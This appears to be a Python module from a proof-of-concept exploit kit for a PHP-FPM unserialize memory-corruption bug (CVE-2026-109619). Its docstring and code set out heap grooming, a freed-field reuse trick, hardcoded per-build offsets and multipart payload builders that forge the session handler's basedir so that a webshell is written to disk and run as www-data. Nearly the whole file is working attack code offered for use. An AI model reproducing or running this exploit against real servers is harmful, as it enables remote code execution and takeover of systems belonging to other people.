#!/usr/bin/env python3
# INDEX: K-free ps_files->basedir file-write, SETTLED/warm-endpoint, stage-fed DT backing | fpm | per-build offsets, NO K leak, works on already-compiled (realistic) endpoints
"""K-FREE ps_files->basedir file-write for a SETTLED (already-compiled / warm) fpm
`unserialize` endpoint (CVE-2026-109619). This is the realistic-target sibling of
kfree_staletail_forge.py, which only lands when the arm is the endpoint script's
FIRST-EVER request (cold-compile layout d=0x1ac000, separate E at d+0x3000). A real
target's endpoint is already compiled/served, so it sits in the SETTLED layout
(d=0x1aa000, embedded E at d+0x38); the cold forge mismatches there and crashes.

Two changes vs kfree_staletail_forge:

1. PRE-TOUCH to force the deterministic settled state. One benign `unserialize` to
   the arm endpoint and one request to the stage endpoint before the real arm pin the
   worker into the settled layout, whether or not the target endpoint was already warm
   (it almost always is). Settled is then as deterministic as cold (verified).

2. STAGE-FED DT backing (removes the arm-filler mmap-reuse dependency). kfree embeds
   the fake ps_files->basedir backing {len, path+NUL} in the arm payload's un-parsed
   filler and relies on the stage's fresh var_dtor_entries (DT) reoccupying those exact
   stale bytes. That coincidence holds only for the cold n1=1100 arm; the settled
   embedded-E arm (n1<=1000, required so the overflow E stays in d's 64KB band and the
   stale-tail fakee stays BELOW d) breaks it. Instead the backing is delivered from the
   STAGE: a large $_POST field `B` is sent then immediately replaced by a tiny field of
   the same name, so the first `B` is FREED; the fresh DT reoccupies its bytes. `B` is
   flooded with the path backing at stride 0x40, phase 0x30 (DT is page-aligned so
   DT->data[2]=page+0x30, and B's data base is 0x40-aligned, so a 0x40/0x30 flood lands
   on data[2] for whatever page the DT takes). No arm-filler mmap coincidence needed.

The stale-tail d->last redirect (harvest K from d->last's stale high bytes, point it at
a carrier-built fake-E) and the two-push ps_files->{last_key,basedir} finisher are
unchanged from kfree_staletail_forge (build_carrier + session_record are imported).

VERIFIED php:8.4.26-fpm behind nginx, BOTH endpoints pre-warmed (realistic), fresh-
container-per-trial, loud d_choff: 12/12 wrote the webshell + GET-fired it
(uid=33(www-data)) + worker survived. NO chunk-base K, no runtime leak of any kind.

PER-BUILD CONSTANTS (SETTLED_CONST) are measured once offline per build/config (same
status/caveats as kfree_staletail_forge.BUILD_CONST). Values here are for lab/fpmfire
(== lab/fpmps), php:8.4.26-fpm.
"""
from __future__ import annotations

import os
import struct
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)

from primitives.groom.script_unserialize_oom_arm import cochunk_payload  # noqa: E402
from primitives.write.kfree_staletail_forge import build_carrier, session_record  # noqa: E402

# php:8.4.26-fpm, lab/fpmfire, settled (both endpoints pre-warmed), fixed arm (no Cookie).
SETTLED_CONST = {
    "arm_prefix": 0xA0000,   # $_POST pad prepended to the arm to raise d
    "n1": 900,               # inner-array count: keeps the overflow E EMBEDDED (d+0x38),
                             #   so E's band = d's band (0x1a) and fakee sits below d
    "d_choff": 0x1AA000,     # BG(unserialize).data chunk offset after the fixed settled arm
    "carrier_base": 0x63000,  # first-fit of the stale-tail carrier field (C)
    "ps_files": 0x56208,     # PS(mod_data) chunk offset (last_key@+0, basedir@+8)
    "fakee": 0x1A0000,       # band(=bits16-20 of E)<<16; must be <= d_choff (carrier reaches it)
    "b_size": 0x40000,       # size of the freed backing field B
    "b_stride": 0x40,        # >= backing size; non-overlapping; dense enough to hit data[2]
    "b_phase": 0x30,         # DT->data[2]=page+0x30, B base 0x40-aligned -> phase 0x30 hits it
    "arm_k": 4_000_000,      # OOM-arm prealloc size: 4e6 OOMs 128M; 512M needs ~12e6
}                            #   (geometry/stagefed_forge_geom.ARM_K; d_choff is unchanged)

# benign unserialize bodies used to pre-compile / warm an endpoint (forces the settled layout)
_PRETOUCH = b"N;"


def pretouch_parts():
    """multipart parts for ONE benign `unserialize($_POST['d'])` that compiles the arm
    endpoint and exercises the decode without OOMing -> pins the SETTLED layout."""
    from common.multipart import part_tuple
    return [part_tuple("d", _PRETOUCH)]


def arm_parts(c=None):
    """multipart parts for the arm POST: the prefix pad + the embedded-E OOM blob `d`
    (cochunk with n1<=1000 so the overflow E stays embedded in d)."""
    from common.multipart import part_tuple
    c = c or SETTLED_CONST
    return [part_tuple("p", b"A" * c["arm_prefix"]),
            part_tuple("d", cochunk_payload(n1=c["n1"], k=c.get("arm_k", 4_000_000)))]


def backing_field(path, c=None):
    """The freed-field `B` value: the real fake-basedir backing {size_t len, path+NUL}
    flooded at (stride, phase) so the fresh DT's data[2] reads a valid long path
    regardless of which page the DT lands on. `len` INCLUDES the NUL so the opened path
    is C-string truncated to exactly `path`."""
    c = c or SETTLED_CONST
    n, stride, phase = c["b_size"], c["b_stride"], c["b_phase"]
    V = bytearray(n)
    pb = (path + "\x00").encode()
    for o in range(phase, n - 0x40, stride):
        struct.pack_into("<Q", V, o, len(pb))
        V[o + 8:o + 8 + len(pb)] = pb
    return bytes(V)


def stage_parts(path, webshell, c=None):
    """multipart parts for the stage POST (settled, stage-fed backing):
      C  : the K-free stale-tail carrier (redirects d->last -> fakE -> ps_files push)
      B  : the flooded path backing (large), then
      B  : a tiny same-named field -> FREES the first B, seeding the fresh DT
      progress : value = webshell (becomes a session key -> live PHP in the written file)
      f  : a $_FILES part whose FILE_START drives the forged pre-RINIT decode+flush.
    Returns (parts, aim)."""
    from common.multipart import part_tuple
    c = c or SETTLED_CONST
    carrier, aim = build_carrier(c)
    parts = [part_tuple("C", carrier),
             part_tuple("B", backing_field(path, c)), part_tuple("B", b"x"),
             part_tuple("PHP_SESSION_UPLOAD_PROGRESS", webshell),
             part_tuple("f", b"Z" * 64, filename="a.bin", ctype="application/octet-stream")]
    return parts, aim
